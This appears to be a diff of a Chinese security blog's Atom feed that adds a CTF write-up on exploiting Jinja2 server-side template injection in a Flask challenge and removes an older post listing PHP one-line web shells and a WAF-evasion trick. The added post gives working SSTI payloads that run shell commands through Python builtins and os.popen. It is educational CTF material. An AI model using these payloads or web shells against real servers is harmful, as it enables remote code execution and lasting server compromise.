@@ -6,7 +6,7 @@
   <link href="https://sakurahack-y.github.io/atom.xml" rel="self"/>
   
   <link href="https://sakurahack-y.github.io/"/>
-  <updated>2022-02-10T13:51:12.046Z</updated>
+  <updated>2022-02-11T03:30:55.289Z</updated>
   <id>https://sakurahack-y.github.io/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>RootersCTF2019 I_&lt;3_Flask 0x70-0x7F</title>
+    <link href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/"/>
+    <id>https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/</id>
+    <published>2022-02-11T02:24:11.000Z</published>
+    <updated>2022-02-11T03:30:55.289Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h1><p>这道题是模板注入。</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102608147.png" alt="image-20220211102608147"></p><p>首先查看源代码，并没有什么用。</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102910418.png" alt="image-20220211102910418"></p><p>dirsearch爆破一下，什么也没有。</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102929099.png" alt="image-20220211102929099"></p><p>本题是flask类题目，ctf常考点不过就是模板注入，所以我们需要寻找可注入参数，本地并没有给出，需要我们自己去爆破。</p><p>我们这里采用arjun工具进行爆破。工具链接：<a href="https://github.com/s0md3v/Arjun">https://github.com/s0md3v/Arjun</a></p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110028885.png" alt="image-20220211110028885">最终可爆破出来参数name。</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211105238512.png" alt="image-20220211105238512"></p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211105250064.png" alt="image-20220211105250064"></p><p>测试了一下的确存在模板注入。</p><p>接下来就是对漏洞的利用。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="工具tplmap"><a href="#工具tplmap" class="headerlink" title="工具tplmap"></a>工具tplmap</h2><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110242684.png" alt="image-20220211110242684"></p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110254561.png" alt="image-20220211110254561"></p><p>成功，发现为Jinja2模板，在ctf题目中经常考察</p><p>直接–os-shell拿下shell，读取flag</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110436293.png" alt="image-20220211110436293"></p><h2 id="手工利用"><a href="#手工利用" class="headerlink" title="手工利用"></a>手工利用</h2><p>只会工具当然不行，有时候工具无法成功，就需要自己手动测试，所以如何手撸也是需要掌握的。</p><p>具体可参考这篇文章，东西很多且杂，写给自己看的大佬别喷我。</p><p><a href="https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/">https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/</a></p><p>首先给几个比较通用的payload</p><pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111654284.png" alt="image-20220211111654284"></p><pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111724780.png" alt="image-20220211111724780"></p><p>然后我们再讲一讲自己如何撸出来一个payload，做法就是寻找可利用的类。</p><p>1、有popen()的类</p><pre><code>os._wrap_closepayload:&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>2、有os模块的</p><p>socket._socketobject（一般在71）、site._Printer等模块</p><pre><code>payload:&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>3、有builtins的类</p><p>__ builtins __代码执行（最常用的方法）</p><p>warnings.catch_warnings含有,常用的还有email.header._ValueFormatter</p><p>__ builtins __  是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__ builtins  __ 这类模块在Python启动时为我们导入了，可以使用dir(__ builtins __ )来查看调用方法的列表，然后可以发现__  builtins __ 下有eval，__ import __等的函数，因此可以利用此来执行命令。</p><p>好了，接下来进行实践。</p><p>我们把所有子类列出来</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112131255.png" alt="image-20220211112131255"></p><p>好家伙出来了很多啊，我们只需要找到我们需要的就好，我们用python脚本跑一下</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>我们先来找下os._wrap_close</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112532522.png" alt="image-20220211112532522"></p><p>已经出来了在132位，那么我们就可以构造一个payload</p><pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>我们来测试一下是否可以</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112709595.png" alt="image-20220211112709595"></p><p>成功列出来了文件。</p><p>直接读取flag</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112747491.png" alt="image-20220211112747491"></p><p>同理，可以利用的类还有很多啊，</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112931751.png" alt="image-20220211112931751"></p><p>就像这个类也在里面包含着，我们同样可以利用它来获取flag。</p><p>方法有很多，理解原理并掌握其中几种方法即可。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;发现漏洞&quot;&gt;&lt;a href=&quot;#发现漏洞&quot; class=&quot;headerlink&quot; title=&quot;发现漏洞&quot;&gt;&lt;/a&gt;发现漏洞&lt;/h1&gt;&lt;p&gt;这道题是模板注入。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/2022/02/11/RootersCTF2019-I-3-Flas</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
+    
+    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
+    
+    
+    <category term="模板注入" scheme="https://sakurahack-y.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>SUCTF 2019 EasyWeb_0x61-0x6F</title>
@@ -532,38 +559,6 @@ def getUrl():
     
     
     <category term="刷题" scheme="https://sakurahack-y.github.io/tags/%E5%88%B7%E9%A2%98/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>一句话木马执行</title>
-    <link href="https://sakurahack-y.github.io/2021/10/08/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
-    <id>https://sakurahack-y.github.io/2021/10/08/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</id>
-    <published>2021-10-08T15:27:36.863Z</published>
-    <updated>2021-10-08T15:27:21.975Z</updated>
-    
-    <content type="html"><![CDATA[<p>正常：<br><?php@eval($_POST['x']);?></p><p>如果有&lt;?过滤，采用：</p><script language="php">eval($_REQUEST[x])</script><p>一种简单的绕安全狗方法：变量传递<br>&lt;?php<br>$a=$_GET[‘x’];<br>$$a=$_GET[‘y’];<br>$b($_POST[‘z’]);</p><p>传入方法：http://       php?x=b&amp;y=assert<br>post:           z=phpinfo();</p><p>问：为什么这里不用eval<br>因为eval赋值给b没有效果的。</p><p>对传入数据进行加密<br><?php assert(base64_decode($_POST['x']));?><br>当这种情况用蚁剑连接时，需要采用base64加密。</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;正常：&lt;br&gt;&lt;?php
-@eval($_POST[&#39;x&#39;]);
-?&gt;&lt;/p&gt;
-&lt;p&gt;如果有&amp;lt;?过滤，采用：&lt;/p&gt;
-&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[x])&lt;/script&gt;
-
-&lt;p&gt;一种简单的绕安全狗方法：变量传递&lt;br&gt;</summary>
-      
-    
-    
-    
-    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
-    
-    <category term="文件上传" scheme="https://sakurahack-y.github.io/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
-    
-    
-    <category term="文件上传" scheme="https://sakurahack-y.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
     
   </entry>
   
